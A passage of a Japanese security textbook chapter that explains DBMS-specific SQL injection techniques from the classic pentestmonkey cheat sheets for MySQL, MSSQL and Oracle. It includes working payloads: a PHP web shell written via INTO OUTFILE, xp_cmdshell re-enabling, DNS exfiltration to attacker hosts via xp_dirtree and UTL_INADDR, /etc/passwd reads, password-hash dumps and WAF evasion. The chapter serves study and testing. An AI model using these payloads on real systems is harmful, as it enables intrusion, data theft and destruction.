# 第4章 DB別技法（MySQL・PostgreSQL・MSSQL・Oracle・SQLite）

## pentestmonkey古典チートシート

本節では、SQLインジェクション界隈で長年「実務者のバイブル」として参照されてきたpentestmonkey.netのDB別チートシート3種（MySQL / MSSQL / Oracle）を扱う。これらは2008〜2011年頃に作成された資料であり、当時から現在に至るまで多くの後継チートシート（PayloadsAllTheThings、HackTricksなど）が構文をほぼそのまま継承している「原典」に近い位置づけを持つ。一方で作成から10年以上が経過しており、掲載されている一部の関数・デフォルト設定はその後のDBMSバージョンで変更・非推奨化・無効化されている。本節は原典の構文をなるべく忠実に示しつつ、各技法が「なぜ機能するのか」という仕組みと、「現在も通用するか」というバージョン注記を必ず併記する。

読み方として、pentestmonkeyのチートシートは共通して次の構成を取る。

- バージョン・環境検出（DBMS種別を確定させる）
- コメント構文（クエリの残り部分を無効化する）
- 文字列連結・型変換関数（データを抽出しやすい形に整形する）
- 条件分岐（真偽値を判定する、ブラインドSQLiの基盤）
- 文字列操作（部分文字列抽出、ブラインド抽出の基盤）
- 時間遅延（レスポンスが見えないときの最終手段）
- スタッククエリ（1つの入力で複数文を実行する）
- ユーザー・DB列挙、ファイル操作・コマンド実行などの高権限操作

この構成そのものが「SQLインジェクションの武器体系」の型であり、他のDBMSのチートシート（本書の他節で扱うPostgreSQLやSQLiteなど）を読むときにも同じ枠組みで整理すると理解が早い。

---

### MySQL SQL Injection Cheat Sheet

> 出典: MySQL SQL Injection Cheat Sheet — https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

#### バージョン・環境検出

```sql
SELECT @@version
SELECT version()
```

`@@version`はMySQLのシステム変数で、サーバのバージョン文字列（例: `8.0.34-0ubuntu0.22.04.1`）を返す。攻撃者がまず最初にこれを確認するのは、後続のペイロード（後述する`information_schema`を使う列挙など）がMySQLのバージョンによって使えるかどうか変わるためである。特に`information_schema`データベースはMySQL 5.0以降で導入されたため、5.0未満のサーバでは別の列挙手法（`mysql.user`テーブルへの直接アクセスなど、より高い権限を要求される）に頼らざるを得ない。

現在のユーザーとホスト名の確認:

```sql
SELECT user()
SELECT system_user()
SELECT current_user()
```

これらはMySQL接続に使われている認証ユーザー（`'root'@'localhost'`のような`user@host`形式）を返す。侵入後の権限確認や、後述のファイル読み書き系関数が使えるかどうかの当たりをつけるのに使う（`FILE`権限を持つユーザーかどうかは、この時点では直接分からないが、`root`や管理系ユーザー名であれば期待値が上がる)。

#### コメント構文

```sql
SELECT 1; -- comment
SELECT 1; # comment
SELECT /*comment*/1;
```

MySQLに固有の注意点として、`--`（ダブルハイフン）コメントは**直後に半角スペースが1つ必要**という仕様がある。多くの他DBMS（MSSQLなど）では`--`単体で行コメントになるが、MySQLでは`--`の後にスペースまたは制御文字が来ないと構文エラーになる。この違いを知らずにペイロードを別DBMSから流用すると、コメントとして解釈されず構文エラーで攻撃が失敗するという典型的な事故が起きる。そのため実務では`--+`（URLエンコードでスペースになる`+`を使う）や、スペースを問題にしない`#`（ハッシュコメント、行末まで無効化）を使うことが多い。`/* */`のブロックコメント内には**インラインコメント**という応用技法があり、`/*!50000SELECT*/`のように`/*!バージョン番号SQL*/`と書くと「そのバージョン番号以降のMySQLサーバでのみ中身を実行する」という条件付き実行になる。これはWAF（Web Application Firewall）が`SELECT`という文字列をブロックしている場合に、コメントに偽装して検出を回避するために使われることがある。

#### 文字列連結

```sql
SELECT CONCAT('A','B')      -- 'AB'
SELECT CONCAT('A','B','C')  -- 'ABC'
```

MySQLは他の多くのDBMS（PostgreSQL、Oracle、MSSQL 2012+）が使う`||`演算子による連結を標準では使えない（`PIPES_AS_CONCAT`SQLモードが有効な場合を除く。デフォルトでは`||`は論理OR演算子として扱われる）。そのためMySQL専用に`CONCAT()`関数を使うのが定石であり、逆に言えば「`||`で連結を試みてエラーになる／論理演算として解釈されてしまう」ことはMySQLを示唆する診断シグナルになる。

#### 文字・16進数エンコーディング

```sql
SELECT 0x616263        -- 'abc' （16進リテラルは自動的に文字列として解釈される）
SELECT CHAR(65,66,67)  -- 'ABC'
SELECT ASCII('A')      -- 65
```

`0x...`形式の16進数リテラルは、MySQLの文脈によって文字列型に暗黙変換される。これが重要な理由は、クォート文字（`'`や`"`）がアプリケーション側でエスケープ・フィルタされている場合でも、16進数表記であればクォートを一切使わずに任意の文字列リテラルを注入できるからである。たとえば`WHERE username = 'admin'`という条件を`WHERE username = 0x61646d696e`と書き換えられる。攻撃者がファイル名やテーブル名のような文字列引数をクォートレスで渡す必要がある場面（特に`LOAD_FILE()`や`INTO OUTFILE`のパス指定）で多用される。

#### 部分文字列抽出とブラインド抽出の基盤

```sql
SELECT SUBSTRING('abcd',3,1)  -- 'c'
SELECT SUBSTR('abcd',3,1)     -- 'c'  (SUBSTRINGの別名)
SELECT MID('abcd',3,1)        -- 'c'
```

`SUBSTRING(文字列, 開始位置, 長さ)`は、ブラインドSQLインジェクション（画面に結果が直接表示されず、真偽の違いだけがレスポンスの差分として現れる攻撃）において中核を担う関数である。攻撃者は`SELECT SUBSTRING(password,1,1)='a'`のような条件を1文字ずつ、1バイトずつ全パスワード文字列に対して検証していくことで、レスポンスが「真の場合の挙動」か「偽の場合の挙動」かの二値情報だけを頼りにデータを1文字ずつ復元できる。これはDBMSがエラーメッセージや結果セットを一切表示しない環境でもデータを抜き出せる、という点でUNION攻撃やエラーベース抽出よりも汎用性が高いが、1文字あたり複数リクエストを要するため低速である。

#### 条件分岐（If文とCase式）

```sql
SELECT IF(1=1,'foo','bar')      -- 'foo'
SELECT IF(1=2,'foo','bar')      -- 'bar'

SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END
```

`IF(条件, 真の場合の値, 偽の場合の値)`はMySQL固有の三項関数であり、ブラインドSQLインジェクションの心臓部である。攻撃者が知りたい真偽値（「パスワードの1文字目はaか」「テーブルusersは存在するか」など）を条件式に代入し、その結果によって出力を変化させる（例: `IF(1=1,SLEEP(5),0)`のように結果を遅延時間に変換する、後述の時間ベース攻撃と組み合わせるパターンが特に有名）。

#### 時間ベース（Time-Based Blind）

```sql
SELECT BENCHMARK(1000000,MD5('A'))
SELECT SLEEP(5)     -- MySQL >= 5.0.12
```

`SLEEP(秒数)`はその名の通りクエリの実行を指定秒数だけ停止させる関数で、MySQL 5.0.12以降で利用可能。ブラインドSQLインジェクションで画面の表示内容にもエラーメッセージにも一切変化が現れない場合、攻撃者は最後の手段として「応答時間の差」を観測チャネルとして使う。たとえば`IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)`を注入し、レスポンスが5秒遅れれば条件が真だったと判定できる。`BENCHMARK(回数,式)`は`SLEEP`が使えない（無効化されている、または監視されている）場合の代替として使われ、指定した式を指定回数だけ繰り返し評価することでCPU負荷による疑似的な遅延を作り出す。ただしBENCHMARKは負荷の予測が難しく、サーバのCPU性能によって遅延時間が変動するという欠点がある。

> ⚠️ **バージョン注記**: `SLEEP()`と`BENCHMARK()`は現行のMySQL/MariaDBでも標準搭載されており2026年現在も機能する。ただし、多くの本番環境ではアプリケーション層のタイムアウトやWAFの応答時間監視によって時間ベース攻撃が検知・遮断されやすくなっている点に注意。

#### スタッククエリ（Stacked Queries）

pentestmonkeyのシートは「MySQLの多くのAPI（特にPHPの`mysql_query()`や`mysqli::query()`の単純呼び出し）はセミコロン区切りの複数文（スタッククエリ）を実行できない」という重要な制約を明記している。これはMySQL自体の制限ではなく、クライアントライブラリ・ドライバ側の制限であることが多い。一方でPDO（PHP Data Objects）の一部の設定や、他言語のドライバではスタッククエリが有効になっている場合があり、その場合は`'; DROP TABLE users; --`のような複数文注入（データ改ざん・破壊、あるいは`INSERT`によるバックドア設置）が可能になる。実務ではまずスタッククエリが有効かどうかを`'; SELECT SLEEP(5); --`のような無害な追加文で確認するのが定石である。

#### ユーザー・権限の列挙（要管理者権限）

```sql
-- ユーザー名とパスワードハッシュの列挙 (MySQL 5.6以前は mysql.user.Password列)
SELECT host, user, password FROM mysql.user;
-- MySQL 5.7以降は authentication_string 列にハッシュが格納される
SELECT host, user, authentication_string FROM mysql.user;

-- 現在のユーザーの権限確認
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;

-- FILE権限を持つユーザーの確認（LOAD_FILE/INTO OUTFILEに必須）
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type = 'FILE';
```

`mysql.user`テーブルは、MySQLサーバに登録された全ユーザーアカウントとそのパスワードハッシュを格納するシステムテーブルであり、これを読み取れるのは強力な権限（`SELECT ON mysql.*`、実質的にはroot相当）を持つDBアカウントに限られる。カラム名がMySQL 5.7で`Password`から`authentication_string`に変わっている点は、バージョンをまたいでペイロードを流用する際の典型的な失敗ポイントである。`information_schema.user_privileges`は標準SQLの情報スキーマビューで、現在の接続ユーザーがどの権限を持つかを確認でき、特に後述するファイル操作系関数が使えるかを事前に判定するのに使われる。

#### データベース・テーブル・カラムの列挙

```sql
SELECT schema_name FROM information_schema.schemata;
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql';
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'target_db';
```

`information_schema`はMySQL 5.0で導入された、SQL標準に準拠したメタデータ用の仮想データベースである。これはアプリケーションのデータそのものではなく、「どんなデータベース・テーブル・カラムが存在するか」というスキーマ情報を保持しており、通常のSELECT権限だけで参照できる（管理者権限を必要としない）。攻撃者がUNION攻撃を成立させる前段階では必ずと言っていいほどこのテーブル群を叩き、標的アプリケーションのテーブル構造を丸ごと把握する。原理としては、MySQLサーバ内部でテーブルやカラムが作成・削除されるたびに、サーバ自身がこのメタデータビューを動的に更新しているため、常に最新のスキーマ構造を反映している。

> ⚠️ **バージョン注記**: `information_schema`はMySQL 8.0以降でも健在だが、8.0からは`information_schema`のパフォーマンスとキャッシュ実装が改善されている（内部的にはDDテーブルを参照する形に変わった）ものの、攻撃者から見えるSQLインターフェースとしての挙動は同じである。

#### ファイル読み取り（`LOAD_FILE`）

```sql
SELECT LOAD_FILE('/etc/passwd');
```

`LOAD_FILE(パス)`はMySQLサーバのファイルシステム上の任意ファイルをそのまま文字列として読み込む関数である。これが機能するには、(1) 接続ユーザーが`FILE`権限を持つこと、(2) MySQLのシステム変数`secure_file_priv`が空、またはそのファイルが`secure_file_priv`が指すディレクトリ配下にあること、(3) 対象ファイルがOSレベルでMySQLサーバプロセスの実行ユーザーから読み取り可能であること、という3条件をすべて満たす必要がある。実務上、`SELECT @@secure_file_priv`をまず投げて設定を確認するのが定石である（`NULL`ならファイル操作は一切禁止、空文字なら無制限、パスが入っていればそのディレクトリのみ許可）。

#### ファイル書き込み（`INTO OUTFILE`）

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

`SELECT ... INTO OUTFILE 'パス'`はSELECT文の結果セットをファイルとしてサーバのディスクに書き出す機能である。これを悪用すると、Webサーバのドキュメントルート配下にPHPのWebシェル（任意コード実行を可能にするスクリプト）を書き込み、SQLインジェクションをOSレベルのRCE（リモートコード実行）にエスカレートできる。この攻撃が成立する条件は`LOAD_FILE`と同様に`FILE`権限と`secure_file_priv`設定に依存し、さらに書き込み先ディレクトリにMySQLサーバプロセスの書き込み権限が必要である。

> ⚠️ **バージョン注記（重要）**: `secure_file_priv`はMySQL 5.5.53(5.5系)/5.6.34(5.6系)/5.7.16(5.7系)以降でデフォルト値が変更され、多くのディストリビューションで**デフォルトが空文字列ではなく特定ディレクトリ（例: `/var/lib/mysql-files`）またはNULLに設定される**ようになった。MySQL 8.0系でもこのデフォルトは維持されており、pentestmonkey作成当時（2011年頃、MySQL 5.1〜5.5時代）に比べて`LOAD_FILE`/`INTO OUTFILE`が無条件に使える環境は大幅に減っている。攻撃を試みる前に`SELECT @@secure_file_priv`で必ず確認すべきである。

#### DNS経由のデータ持ち出しについて

pentestmonkeyのシートは「MySQLにはDNSルックアップを起こすビルトイン関数がなく、MySQLからのDNS経由のデータ抽出（帯域外攻撃, OOB/Out-of-Band）は基本的に不可能」と明記している（"Impossible" ‑ Unless you know different?と記述されている）。これはOracleの`UTL_HTTP`/`UTL_INADDR`やMSSQLの`xp_dirtree`・拡張ストアドプロシージャに相当する、任意の外部ホスト名解決を引き起こす標準関数がMySQLコアには存在しないためである。実務ではこの制約のため、MySQLでの帯域外抽出は主にUDF（ユーザー定義関数）経由でOSコマンドを実行し、そこからOSのDNSクライアント（`nslookup`など）を叩くという、より重い前提条件（`FILE`権限＋UDF共有ライブラリの書き込み）を要する手法に頼ることになる。

> ⚠️ **未取得の資料に関する補足ではなく現行知識の補足**: MySQL 5.5以降で追加された`mysqludf`系の任意UDFロード手法や、`GET_LOCK()`のタイミングを使った擬似OOBチャネルなど、原典公開後に広まった技法もある。これらはpentestmonkeyシート自体には含まれないため、本節ではあくまで原典の記述（DNS完全不可）を基準として示す。

---

### MSSQL SQL Injection Cheat Sheet

> 出典: MSSQL SQL Injection Cheat Sheet — https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

#### バージョン・環境検出

```sql
SELECT @@version
```

MSSQLの`@@version`はビルド番号だけでなく、OSレベルの情報（Windows Server版数、CPUアーキテクチャ、Service Pack）まで含む長大な文字列を返すことが多い（例: `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ... on Windows Server 2019 Standard`）。これはMySQLやOracleに比べてバージョン検出1回で得られる情報量が非常に多く、攻撃者にとって効率の良い偵察ポイントになっている。

現在のユーザーとデータベース:

```sql
SELECT user_name()
SELECT system_user
SELECT user
SELECT db_name()
```

`system_user`と`user`はMSSQL独自の「関数ではなくニラリー変数（Niladic function、括弧なしで呼び出せる特殊関数）」であり、それぞれWindows/SQL認証で使われたログイン名と、現在のデータベースユーザー名を返す。両者が異なる場合（`system_user`はドメインアカウント、`user`は`dbo`など）は、アプリケーションがどのような認証方式・権限マッピングでDBに接続しているかのヒントになる。

#### コメント構文

```sql
SELECT 1--comment
SELECT /*comment*/1
```

MSSQLの`--`はMySQLと違い**後続にスペースが不要**で、そのまま行末までをコメントアウトする。この違いはDBMSフィンガープリンティング（対象がMySQLかMSSQLかを判別する手がかり）としても使われ、「`--`の直後にスペースなしで文字を続けてもエラーにならなければMSSQL（またはOracle/PostgreSQL）の可能性が高い」という判定材料になる。

#### 文字列連結

```sql
SELECT 'A'+'B'    -- 'AB'
```

MSSQLは文字列連結に`+`演算子を使う。これはMySQLの`CONCAT()`、Oracle/PostgreSQLの`||`とは異なる第三の方式であり、この違いだけでもDBMS種別をかなり絞り込める。ただし`+`は数値の加算とも解釈されるため、注入点が数値コンテキストか文字列コンテキストかによって、同じ`+`が別の意味を持つ点に注意が必要である（例えばUNIONベースで数値カラムに文字列を混ぜようとして`+`演算が加算として解釈され、意図しない挙動になることがある）。

#### 文字・ASCII変換

```sql
SELECT ASCII('a')    -- 97
SELECT CHAR(0x41)    -- 'A'
SELECT SUBSTRING('abcd',3,1)  -- 'c'
```

`SUBSTRING`はMySQLと共通の構文で使え、`ASCII()`/`CHAR()`もブラインド抽出時の1文字ずつのバイナリサーチ（2分探索でASCIIコード値を絞り込む手法）に使われる。

#### 条件分岐

```sql
IF (1=1) SELECT 1 ELSE SELECT 2
```

MSSQLの`IF`文は、MySQLの`IF()`関数と違い**式ではなく文（ステートメント）**である点に注意が必要である。つまりSELECT文の中に埋め込むことができず、独立した制御構文として複数文の一部で使う必要がある。これはブラインドSQLインジェクションを組み立てる際、注入箇所がサブクエリ内か独立したステートメントとして実行できるか（＝スタッククエリが可能か）によって使える構文が変わってくることを意味する。単一のSELECT内で真偽分岐を表現したい場合は`CASE WHEN ... THEN ... ELSE ... END`式を使う。

```sql
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END
```

#### 時間ベース（Time-Based Blind）

```sql
WAITFOR DELAY '0:0:5'
```

`WAITFOR DELAY '時:分:秒'`は、指定した時間だけクエリの実行を一時停止するMSSQL固有のT-SQLステートメントである。MySQLの`SLEEP()`と役割は同じだが、構文が「関数」ではなく「文」であるため、`; WAITFOR DELAY '0:0:5'--`のようにスタッククエリ（セミコロン区切り）として注入する必要がある点が異なる。MSSQLはODBC/ADO.NET経由の接続でスタッククエリがデフォルトで許可されていることが多く（MySQLのドライバ制限と対照的）、この点がMSSQLの時間ベース攻撃を比較的成立させやすくしている一因である。

#### スタッククエリ（Stacked Queries）

```sql
'; EXEC master..xp_cmdshell 'ping 10.0.0.1'--
```

MSSQLはドライバレベルで複数文（セミコロン区切り）の一括実行を許可していることが多く、これがMSSQLに対するSQLインジェクションを特に危険にしている最大の理由である。1回の注入で`SELECT`、`INSERT`、`EXEC`（ストアドプロシージャ呼び出し）を含む任意の文を連続実行できるため、単なる情報漏えいに留まらず、直接的なシステム侵害（後述の`xp_cmdshell`）にまで発展しやすい。

#### `xp_cmdshell`によるOSコマンド実行（要sysadmin権限）

```sql
EXEC master..xp_cmdshell 'ping 10.0.0.1'
```

`xp_cmdshell`はMSSQLに組み込まれた拡張ストアドプロシージャで、渡した文字列をそのままOSのコマンドシェル（`cmd.exe`）に渡して実行し、その標準出力を結果セットとして返す。これはSQLインジェクションからOSレベルの完全なリモートコード実行への「最終到達点」として長年知られてきた技法である。ただし実行には接続ユーザーが`sysadmin`固定サーバロールを持つ必要があり、かつMSSQL 2005以降は**デフォルトで無効化**されている。無効化されている場合でも、`sysadmin`権限さえあれば以下のように再有効化できる。

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

`sp_configure`はサーバ全体の構成オプションを変更するシステムストアドプロシージャで、`show advanced options`を1にしないと`xp_cmdshell`のような「高度なオプション」自体が`sp_configure`の一覧に現れない、という2段階の操作が必要になる。`RECONFIGURE`を実行して初めて変更が実際にサーバへ反映される。

> ⚠️ **バージョン注記**: `xp_cmdshell`のデフォルト無効化はMSSQL 2005で導入され、以降のすべてのバージョン（2008/2012/2016/2019/2022）で継続している。またAzure SQL Database（PaaS版）では`xp_cmdshell`自体が原理的に利用不可（基盤となるOSシェルへのアクセスがサービスとして提供されないため）であり、オンプレミス/IaaS版のSQL Serverとは前提が異なる点に注意。

#### パスワードハッシュの列挙（要管理者権限）

```sql
-- MSSQL 2005以降
SELECT name, password_hash FROM master.sys.sql_logins;
-- MSSQL 2000
SELECT name, password FROM master..sysxlogins;
```

`sys.sql_logins`はMSSQL 2005で刷新されたシステムカタログビューで、SQL認証（Windows認証ではなくSQL Server独自のユーザー名/パスワード認証）を使うログインアカウントのパスワードハッシュを保持する。旧バージョン（MSSQL 2000）ではこの構造が異なり`sysxlogins`という別テーブルを直接参照する必要があった点は、対象バージョンによって構文を変える必要がある典型例である。

#### データベース・テーブル・カラムの列挙

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM sysobjects WHERE xtype = 'U';   -- ユーザーテーブル一覧
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'target_table');

-- information_schemaを使う標準SQL準拠の方法（MSSQL 2000以降で利用可）
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name = 'target_table';
```

MSSQLには独自のシステムカタログ（`sysobjects`/`syscolumns`、`xtype='U'`はユーザー定義テーブルを示すフラグ）と、標準SQL準拠の`information_schema`という2系統の列挙手段が並存する。前者はMSSQL独自の内部実装に依存する古い方式、後者はANSI SQL標準に沿った移植性の高い方式であり、WAFのシグネチャが片方だけをブロックしている場合にもう一方を試す、というバイパス手段としても機能する。

#### DNS経由のデータ持ち出し（帯域外攻撃）

```sql
EXEC master..xp_dirtree '\\attacker-server\share'
```

`xp_dirtree`は本来UNCパス（`\\サーバ名\共有名`）配下のディレクトリ一覧を取得する拡張ストアドプロシージャだが、副作用としてそのUNCパスに対するSMB接続を試み、その過程でサーバ名部分のDNS名前解決（またはNetBIOS名前解決）が発生する。攻撃者が自分の管理するDNSサーバのサブドメインをこのUNCパスに指定すれば、DNSクエリのログから盲目的にデータを抜き出せる（例えば抽出したい1文字ごとにサブドメインを変えたUNCパスをループで叩く）。`xp_fileexist`も同様の副作用を持つ代替手段として言及されている。この手法の利点は`xp_cmdshell`のような強力な権限を要求せず、`xp_dirtree`は比較的低い権限でも実行できる場合がある点である。

> ⚠️ **バージョン注記**: `xp_dirtree`によるDNS/OOB抽出は現在も広く使われる実用的な手法として存続しているが、多くの組織で外向きSMB通信（TCP 445）がファイアウォールでブロックされているため、成立にはネットワーク環境の前提条件が伴う。

---

### Oracle SQL Injection Cheat Sheet

> 出典: Oracle SQL Injection Cheat Sheet — https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

#### Oracle特有の大前提: `FROM DUAL`

```sql
SELECT 1 FROM dual;
```

Oracleを他のDBMSと決定的に分けるOracle SQLの仕様として、**`SELECT`文には必ず`FROM`句が必要**という制約がある。MySQL/PostgreSQL/MSSQLでは`SELECT 1`のように定数だけを問い合わせるSELECT文を`FROM`なしで書けるが、Oracleのパーサはこれを構文エラーとして拒否する。そこでOracleには`DUAL`という、あらゆるスキーマから参照できる「1行1列のダミーテーブル」が標準で用意されており、実際のテーブルを参照する必要がない問い合わせでは慣習的に`FROM dual`を付ける。これはSQLインジェクションのペイロードを組み立てる際に常に付いて回る制約であり、Oracle向けのUNION攻撃ペイロードが他DBMSより一段階複雑になる理由の一つでもある。

#### バージョン検出

```sql
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT version FROM v$instance;
```

`v$version`はOracleの動的パフォーマンスビュー（`v$`から始まるビュー群で、インスタンスの内部状態やバージョン情報を保持する）の一つで、通常はSELECT権限を持つ一般ユーザーでも参照できる。`banner`列には`Oracle Database 19c Enterprise Edition Release 19.0.0.0.0`のような詳細なバージョン文字列が入っている。

#### コメント構文

```sql
SELECT 1 FROM dual -- comment
SELECT /*comment*/1 FROM dual
```

Oracleの行コメント`--`もMSSQLと同様にスペース不要で行末まで無効化する。

#### 文字列連結

```sql
SELECT 'A'||'B' FROM dual;  -- 'AB'
SELECT CHR(65)||CHR(66) FROM dual;  -- 'AB'
```

Oracleは標準SQL準拠の`||`演算子で文字列連結を行う（PostgreSQLと共通）。`CHR()`はASCIIコード（または該当する文字集合のコードポイント）から文字を生成する関数で、クォート文字を使わずに任意の文字列を組み立てたい場合（WAFがシングルクォートをフィルタしている場合など）に、`CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)`のように1文字ずつ連結して`SELECT`という単語を動的に生成する、といった回避テクニックの土台になる。

#### 条件分岐

```sql
SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END FROM dual;
```

Oracleには MySQLの`IF()`のような単純な三項関数が標準では存在せず（PL/SQLのプロシージャ内でなら`IF`文が使えるが、SQL文の中では使えない）、SQL文中での条件分岐は基本的に`CASE WHEN`式に頼ることになる。これもOracleがMySQL/MSSQLと構文的に一線を画す点であり、DBMSフィンガープリンティングの材料になる（`IF(1=1,'a','b')`を注入してエラーになればOracleではない可能性が高い、といった消去法的な判定に使われる）。

#### 時間ベース（Time-Based Blind）

```sql
BEGIN DBMS_LOCK.SLEEP(5); END;
```

`DBMS_LOCK.SLEEP(秒数)`は、指定秒数だけセッションを一時停止させるOracle標準パッケージのプロシージャである。重要な点として、これは**SQL文の中に直接埋め込める関数ではなく、PL/SQLのプロシージャ呼び出し**であるため、`BEGIN ... END;`という無名PL/SQLブロックの中でしか使えない。SQLインジェクションの注入点が単純なSELECT文のサブクエリの一部である場合、そのままでは`DBMS_LOCK.SLEEP`を呼び出せず、別の遅延手段（例えば大きな結果セットに対する重い正規表現マッチや、意図的に非効率なジョインを行わせるなど、CPU負荷で疑似的に遅延させる手法）に頼らざるを得ないケースがある。また`DBMS_LOCK`パッケージへの`EXECUTE`権限が付与されていない環境も多く、権限エラーで失敗することがある。

> ⚠️ **バージョン注記**: `DBMS_LOCK`はOracle Database全バージョンを通じて標準搭載されているが、デフォルトで`PUBLIC`(全ユーザー)に実行権限が付与されているとは限らない。Oracle 11g以降、セキュリティ強化の流れで多くのパッケージへのデフォルト`PUBLIC`権限が絞られる傾向にあり、環境によっては権限不足で使えないことがある。

#### 外部通信によるデータ持ち出し（`UTL_HTTP`/`UTL_INADDR`）

```sql
SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual;
SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;
```

`UTL_INADDR`はホスト名からIPアドレスへの名前解決（DNSルックアップ）を行う標準パッケージ、`UTL_HTTP`は任意のURLに対してHTTPリクエストを送信できる標準パッケージである。どちらもOracleサーバから外部ネットワークへの通信を発生させるため、帯域外（OOB）データ抽出の代表的な手段として悪用される。`UTL_INADDR.get_host_address()`にブラインド抽出したいデータをサブドメインとして埋め込んだホスト名（例: `SUBSTR(password,1,1)||'.attacker.com'`のように動的に組み立てたドメイン名）を渡せば、攻撃者が管理するDNSサーバのクエリログから、画面表示やタイミングに頼らず直接データを読み取れる。`UTL_HTTP.REQUEST`はさらに直接的にHTTP経由でデータを持ち出すことも可能である。

> ⚠️ **バージョン注記**: `UTL_HTTP`と`UTL_INADDR`はOracle Database全バージョンで標準搭載されているが、11g以降はOracleのファイングレインドアクセス制御である`DBMS_NETWORK_ACL_ADMIN`によって、どのホスト・ポートへの通信を許可するかをACL（アクセス制御リスト）で明示的に許可しなければ動作しないよう制限されるようになった。したがってpentestmonkeyシート作成当時（Oracle 10g/11g初期を想定）よりも、現行のデフォルト構成ではこれらの関数が制限なく使える可能性は低くなっている。

#### テーブル・カラムの列挙

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT table_name FROM user_tables;
SELECT column_name FROM all_tab_columns WHERE table_name = 'TARGET_TABLE';
```

Oracleのデータディクショナリビューには`user_`、`all_`、`dba_`という3段階の可視範囲プレフィックスがある。`user_tables`は現在接続しているユーザー自身が所有するテーブルのみ、`all_tables`はそのユーザーがアクセス権を持つ全テーブル（他スキーマ所有のものを含む）、`dba_tables`はインスタンス全体の全テーブル（DBA権限が必要）を返す。SQLインジェクションでは自スキーマ以外のテーブルも狙うため`all_tables`が最もよく使われる。また、Oracleはデフォルトでテーブル名・カラム名を**大文字**で格納する（引用符なしで作成した識別子は自動的に大文字化される）ため、`WHERE table_name = 'target_table'`のように小文字で条件を書くと一致せず結果が空になる、という初心者がよく踏む罠がある。

#### ユーザー列挙

```sql
SELECT username FROM all_users ORDER BY username;
SELECT username FROM dba_users;  -- 要DBA権限、パスワードハッシュ列も含む場合がある
```

`all_users`はインスタンス内の全データベースユーザー（スキーマ）の一覧を返す、多くの環境で一般ユーザーからも参照可能なビューである。`dba_users`はより詳細な情報（アカウントステータス、旧バージョンではパスワードハッシュを含む`PASSWORD`列があったが、Oracle 11g以降ではこの列が撤廃され、代わりに`SYS.USER$`のような内部テーブルへのアクセスが必要になっている）を提供するが、参照にはDBA相当の権限が要る。

---

### 3つのチートシートを貫く共通原理のまとめ

MySQL・MSSQL・Oracleの3種を並べて読むと、SQLインジェクションの技法がDBMSの実装差異に強く依存する一方で、攻撃者が確認する「チェックリストの構造」自体はDBMSを問わず共通していることが分かる。

| 目的 | MySQL | MSSQL | Oracle |
|---|---|---|---|
| バージョン確認 | `@@version` | `@@version` | `v$version` |
| コメント | `#` / `-- `（スペース必須）| `--` | `--` |
| 文字列連結 | `CONCAT(a,b)` | `a+b` | `a\|\|b` |
| 条件分岐 | `IF(cond,t,f)` | `CASE WHEN` | `CASE WHEN` |
| 時間遅延 | `SLEEP(n)` | `WAITFOR DELAY '0:0:n'` | `DBMS_LOCK.SLEEP(n)`(PL/SQLブロック要) |
| ダミーテーブル | 不要 | 不要 | `FROM dual`必須 |
| 高権限操作 | `LOAD_FILE`/`INTO OUTFILE` | `xp_cmdshell` | `UTL_HTTP`/`UTL_INADDR` |
| DNS/OOB | 標準では不可 | `xp_dirtree`のUNCパス解決 | `UTL_INADDR`のDNS解決 |

この表が示すように、攻撃者はまずエラーメッセージやバージョン文字列、コメント構文の挙動差からDBMS種別を特定し（フィンガープリンティング）、その後は対応する列のペイロードに機械的に差し替えていくだけで攻撃を横展開できる。防御側の観点からも同じ表が有効で、WAFやIDSのシグネチャをDBMS横断で設計する際、この「役割ごとの対応表」を土台にルールを組むと抜け漏れを防ぎやすい。

最後に、これら3つのチートシートはいずれも2008〜2011年頃に作成された資料であり、`secure_file_priv`のデフォルト強化（MySQL）、`xp_cmdshell`のデフォルト無効化（MSSQL、2005年以降）、`UTL_HTTP`/`UTL_INADDR`へのACL制限（Oracle、11g以降）など、**掲載当時は「デフォルトで通用した」技法の多くが、現行バージョンでは追加の権限昇格や設定変更を前提とするようになっている**。実務でこれらのペイロードを使う際は、必ず対象環境のバージョンと現在の設定（`secure_file_priv`の値、`xp_cmdshell`の有効状態、ネットワークACLの設定など）を先に確認し、「原典の記述通りに動くとは限らない」という前提で読むことが、この種の古典チートシートを2026年現在も実務で活かすための鍵となる。

## DBMS別ペイロード（保守版）

本節は SQL インジェクションの検出・悪用手法のうち、DBMS(データベース管理システム)固有の構文や機能に依存する部分を、MySQL・MSSQL(Microsoft SQL Server)・SQLite の3系統に分けて整理する。参照先は PayloadsAllTheThings リポジトリの各DBMS別ページで、コミュニティによって継続的に更新されている「実戦チートシート」である。UNION攻撃やエラーベース抽出の一般原理は別節で扱ったため、ここではその原理が「各DBMSの実装差」としてどう表面化するか——コメント構文、情報スキーマの位置、ファイルI/O、OSコマンド実行、帯域外(OOB)通信——に絞って解説する。

### なぜDBMSごとに構文が変わるのか

SQLは標準化されているとはいえ、実装ごとに独自拡張(vendor extension)が非常に多い言語である。攻撃者がペイロードを組み立てる際に直面する差異は主に次の3層に分かれる。

